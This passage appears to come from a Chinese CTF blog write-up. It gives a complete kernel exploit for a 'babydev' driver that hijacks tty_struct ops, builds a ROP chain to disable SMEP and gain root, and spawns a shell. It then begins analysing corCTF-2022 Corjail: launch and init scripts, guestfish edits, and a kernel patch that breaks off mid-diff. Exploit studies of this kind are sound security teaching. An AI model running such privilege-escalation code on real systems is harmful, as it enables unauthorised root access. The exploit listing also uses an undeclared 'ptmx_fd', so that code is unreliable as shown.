class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) = commit_creds_addr;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_rflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> master_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="comment">// 交换rsp与rax低四位，且将高4位清零。</span></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// fake_tty_ops是一个用户栈变量，保留低4位。</span></span><br><span class="line">    <span class="type">size_t</span> hijacked_stack_addr = ((<span class="type">size_t</span>)xchg_eax_esp_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">// 通过 tty_struct 执行 ioctl 时，rax 的值正好是 xchg_eax_esp_addr 指令的地址。</span></span><br><span class="line">    <span class="type">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))<span class="number">-0x1000</span>, <span class="comment">// 对齐。</span></span><br><span class="line">            <span class="number">0x30000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_stack, <span class="number">0</span>, <span class="number">0x30000</span>);</span><br><span class="line">    <span class="type">size_t</span> rop_chain_mem[] = &#123;</span><br><span class="line">        pop_rdi_addr, <span class="number">0x6f0</span>,</span><br><span class="line">        mov_cr4_rdi_pop_rbp_addr, <span class="number">0</span>, get_root,</span><br><span class="line">        swapgs_pop_rbp_addr, <span class="number">0</span>,</span><br><span class="line">        iretq_addr, get_shell, user_cs, user_rflags, user_rsp, user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(hijacked_stack_addr, rop_chain_mem, <span class="keyword">sizeof</span>(rop_chain_mem));</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">    *    struct tty_struct &#123;</span></span><br><span class="line"><span class="comment">    *        int  magic;                        : 4</span></span><br><span class="line"><span class="comment">    *        struct kref kref;  // atomic_t		: 4</span></span><br><span class="line"><span class="comment">    *        struct device *dev;				: 8</span></span><br><span class="line"><span class="comment">    *        struct tty_driver *driver;			: 8	</span></span><br><span class="line"><span class="comment">    *        const struct tty_operations *ops;	: 8</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="type">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="comment">// ops_ptr_addr -&gt; overwrite_mem+ops_ptr_offset -&gt; value</span></span><br><span class="line">    <span class="type">char</span>** ops_ptr_addr = overwrite_mem + ops_ptr_offset;</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="comment">// value = &amp;fake_tty_ops</span></span><br><span class="line">    *ops_ptr_addr = &amp;fake_tty_ops;</span><br><span class="line">    <span class="comment">// change kernel ptmx ops_ptr</span></span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">	<span class="comment">// call fake_ops-&gt;ioctl to complete stack_pivot and exec our shellcode</span></span><br><span class="line">    ioctl(ptmx_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="corCTF-2022-Corjail"><a href="#corCTF-2022-Corjail" class="headerlink" title="corCTF-2022 Corjail"></a>corCTF-2022 Corjail</h2><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>我们可以使用 <code>Guestfish</code> 工具读取和修改 <code>qcow2</code> 文件。</p>
<p><strong>run_challenge.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda quiet loglevel=3 rd.systemd.show_status=auto rd.udev.log_level=3 oops=panic panic=-1 net.ifnames=0 pti=on&quot;</span> \</span><br><span class="line">    -hda coros.qcow2 \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -cpu qemu64,+smep,+smap,+rdrand \</span><br><span class="line">    -smp cores=4 \</span><br><span class="line">    --enable-kvm</span><br></pre></td></tr></table></figure></div>

<p><strong>init脚本</strong></p>
<p>查看服务进程<code>/etc/systemd/system/init.service</code>；</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Description=Initialize challenge</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/usr/local/bin/init</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/usr/local/bin/init</code> 脚本;</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cat</span> /usr/local/bin/init</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">USER=user</span><br><span class="line"></span><br><span class="line">FLAG=$(<span class="built_in">head</span> -n 100 /dev/urandom | <span class="built_in">sha512sum</span> | awk <span class="string">&#x27;&#123;printf $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useradd --create-home --shell /bin/bash <span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PS1=&#x27;\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &#x27;&quot;</span>  &gt;&gt; /root/.bashrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PS1=&#x27;\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;&quot;</span> &gt;&gt; /home/<span class="variable">$USER</span>/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> -r 0700 /home/<span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> /root/temp /root/<span class="variable">$FLAG</span></span><br><span class="line"><span class="built_in">chmod</span> 0400 /root/<span class="variable">$FLAG</span></span><br></pre></td></tr></table></figure></div>

<p><strong>password</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ guestfish --rw -a coros.qcow2</span><br><span class="line">&gt;&lt;fs&gt; run</span><br><span class="line">&gt;&lt;fs&gt; list-filesystems</span><br><span class="line">/dev/sda: ext4</span><br><span class="line">&gt;&lt;fs&gt; mount /dev/sda /</span><br><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /etc/password</span><br><span class="line">libguestfs: error: download: /etc/password: No such file or directory</span><br><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/usr/local/bin/jail</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>

<p><strong>root_shell</strong></p>
<p>查看<code>root</code>用户的<code>/usr/local/bin/jail</code>;</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /usr/local/bin/jail</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span></span><br><span class="line"></span><br><span class="line">/usr/bin/docker run -it --user user \</span><br><span class="line">	--hostname CoRJail \</span><br><span class="line">    --security-opt seccomp=/etc/docker/corjail.json \</span><br><span class="line">    -v /proc/cormon:/proc_rw/cormon:rw corcontainer</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br><span class="line"></span><br><span class="line">/usr/sbin/poweroff -f</span><br></pre></td></tr></table></figure></div>

<p>发现其启动<code>root</code>的 <code>shell</code> 后是首先调用 <code>docker</code>来构建了一个容器然后关闭自身，在那之后我们起的虚拟环境就是处于该<code>docker</code>容器当中。</p>
<p>为了方便调试，我们可以使用<code>edit</code>将其修改为:</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;fs&gt; edit /usr/local/bin/jail </span><br><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /usr/local/bin/jail</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /exploit /home/user || <span class="built_in">echo</span> <span class="string">&quot;[!] exploit not found, skipping&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R user:user /home/user</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">/usr/bin/docker run -it --user root \</span><br><span class="line">  --hostname CoRJail \</span><br><span class="line">  --security-opt seccomp=/etc/docker/corjail.json \</span><br><span class="line">  <span class="comment"># 允许容器能够调用与日志相关的系统调用</span></span><br><span class="line">  --cap-add CAP_SYSLOG \</span><br><span class="line">  <span class="comment"># 将宿主机的 /proc/cormon 目录挂载到容器内的 /proc_rw/cormon，并且以读写模式挂载。</span></span><br><span class="line">  -v /proc/cormon:/proc_rw/cormon:rw \</span><br><span class="line">  <span class="comment"># 将宿主机的 /home/user/ 目录挂载到容器内的 /home/user/host</span></span><br><span class="line">  -v /home/user/:/home/user/host \</span><br><span class="line">  corcontainer</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br><span class="line"></span><br><span class="line">/usr/sbin/poweroff -f</span><br></pre></td></tr></table></figure></div>

<p><code>edit</code> 的用法和 <code>vim</code> 一样。</p>
<p>后面我们上传 <code>exp</code> 的时候可以使用 <code>upload</code> 命令，其格式如下:</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;fs&gt; <span class="built_in">help</span> upload</span><br><span class="line">NAME</span><br><span class="line">    upload - upload a file from the <span class="built_in">local</span> machine</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">     upload filename remotefilename</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">    Upload <span class="built_in">local</span> file filename to remotefilename on the filesystem.</span><br><span class="line"></span><br><span class="line">    filename can also be a named pipe.</span><br><span class="line"></span><br><span class="line">    See also <span class="string">&quot;download&quot;</span>.</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>kernel_patch</strong></p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c</span><br><span class="line"><span class="comment">--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200</span></span><br><span class="line"><span class="meta">@@ -17,6 +17,9 @@</span></span><br><span class="line"> </span><br><span class="line"> #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,</span><br><span class="line"> </span><br><span class="line"><span class="addition">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);</span></span><br><span class="line"><span class="addition">+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = &#123;</span><br><span class="line"> 	/*</span><br><span class="line"> 	 * Smells like a compiler bug -- it doesn&#x27;t work</span><br><span class="line">diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h</span><br><span class="line"><span class="comment">--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200</span></span><br><span class="line"><span class="meta">@@ -245,7 +245,7 @@</span></span><br><span class="line">  * SYSCALL_DEFINEx() -- which is essential for the COND_SYSCALL() and SYS_NI()</span><br><span class="line">  * macros to work correctly.</span><br><span class="line">  */</span><br><span class="line"><span class="deletion">-#define SYSCALL_DEFINE0(sname)						\</span></span><br><span class="line"><span class="addition">+#define __SYSCALL_DEFINE0(sname)						\</span></span><br><span class="line"> 	SYSCALL_METADATA(_##sname, 0);					\</span><br><span class="line"> 	static long __do_sys_##sname(const struct pt_regs *__unused);	\</span><br><span class="line"> 	__X64_SYS_STUB0(sname)						\</span><br><span class="line">diff -ruN a/include/linux/syscalls.h b/include/linux/syscalls.h</span><br><span class="line"><span class="comment">--- a/include/linux/syscalls.h	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/include/linux/syscalls.h	2022-07-02 12:34:11.237778657 +0200</span></span><br><span class="line"><span class="meta">@@ -82,6 +82,7 @@</span></span><br><span class="line"> #include &lt;linux/key.h&gt;</span><br><span class="line"> #include &lt;linux/personality.h&gt;</span><br><span class="line"> #include &lt;trace/syscall.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;asm/syscall.h&gt;</span></span><br><span class="line"> </span><br><span class="line"> #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER</span><br><span class="line"> /*</span><br><span class="line"><span class="meta">@@ -202,8 +203,8 @@</span></span><br><span class="line"> &#125;</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-#ifndef SYSCALL_DEFINE0</span></span><br><span class="line"><span class="deletion">-#define SYSCALL_DEFINE0(sname)					\</span></span><br><span class="line"><span class="addition">+#ifndef __SYSCALL_DEFINE0</span></span><br><span class="line"><span class="addition">+#define __SYSCALL_DEFINE0(sname)					\</span></span><br><span class="line"> 	SYSCALL_METADATA(_##sname, 0);				\</span><br><span class="line"> 	asmlinkage long sys_##sname(void);			\</span><br><span class="line"> 	ALLOW_ERROR_INJECTION(sys_##sname, ERRNO);		\</span><br><span class="line"><span class="meta">@@ -219,9 +220,41 @@</span></span><br><span class="line"> </span><br><span class="line"> #define SYSCALL_DEFINE_MAXARGS	6</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-#define SYSCALL_DEFINEx(x, sname, ...)				\</span></span><br><span class="line"><span class="deletion">-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\</span></span><br><span class="line"><span class="deletion">-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)</span></span><br><span class="line"><span class="addition">+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define __SYSCALL_COUNT(syscall_nr) \</span></span><br><span class="line"><span class="addition">+	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\</span></span><br><span class="line"><span class="addition">+	&#123;									\</span></span><br><span class="line"><span class="addition">+		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\</span></span><br><span class="line"><span class="addition">+		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\</span></span><br><span class="line"><span class="addition">+	&#125;									\</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_DECLARE0(sname) \</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys_##sname(void);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_FUNC0(sname)					\</span></span><br><span class="line"><span class="addition">+	&#123;								\</span></span><br><span class="line"><span class="addition">+		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\</span></span><br><span class="line"><span class="addition">+		return __count_sys_##sname();				\</span></span><br><span class="line"><span class="addition">+	&#125;								\</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys_##sname(void)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_DEFINEx(x, sname, ...)			\</span></span><br><span class="line"><span class="addition">+	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\</span></span><br><span class="line"><span class="addition">+	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_DEFINE0(sname)		\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_DECLARE0(sname)	\</span></span><br><span class="line"><span class="addition">+	__SYSCALL_DEFINE0(sname)	\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_FUNC0(sname)</span></span><br><span class="line"> </span><br><span class="line"> #define __PROTECT(...) asmlinkage_protect(__VA_ARGS__)</span><br><span class="line"> </span><br><span class="line">diff -ruN a/kernel/trace/trace_syscalls.c b/kernel/trace/trace_syscalls.c</span><br><span class="line"><span class="comment">--- a/kernel/trace/trace_syscalls.c	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/kernel/trace/trace_syscalls.c	2022-07-02 12:34:32.902426748 +0200</span></span><br><span class="line"><span class="meta">@@ -101,7 +101,7 @@</span></span><br><span class="line"> 	return NULL;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static struct syscall_metadata *syscall_nr_to_meta(int nr)</span></span><br><span class="line"><span class="addition">+struct syscall_metadata *syscall_nr_to_meta(int nr)</span></span><br><span class="line"> &#123;</span><br><span class="line"> 	if (IS_ENABLED(CONFIG_HAVE_SPARSE_SYSCALL_NR))</span><br><span class="line"> 		return xa_load(&amp;syscalls_metadata_sparse, (unsigned long)nr);</span><br><span class="line"><span class="meta">@@ -111,6 +111,7 @@</span></span><br><span class="line"> </span><br><span class="line"> 	return syscalls_metadata[nr];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="addition">+EXPORT_SYMBOL(syscall_nr_to_meta);</span></span><br><span class="line"> </span><br><span class="line"> const char *get_syscall_name(int syscall)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="meta">@@ -122,6 +123,7 @@</span></span><br><span class="line"> </span><br><span class="line"> 	return entry-&gt;name;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="addition">+EXPORT_SYMBOL(get_syscall_name);</span></span><br><span class="line"> </span><br><span class="line"> static enum print_line_t</span><br><span class="line"> print_syscall_enter(struct trace_iterator *iter, int 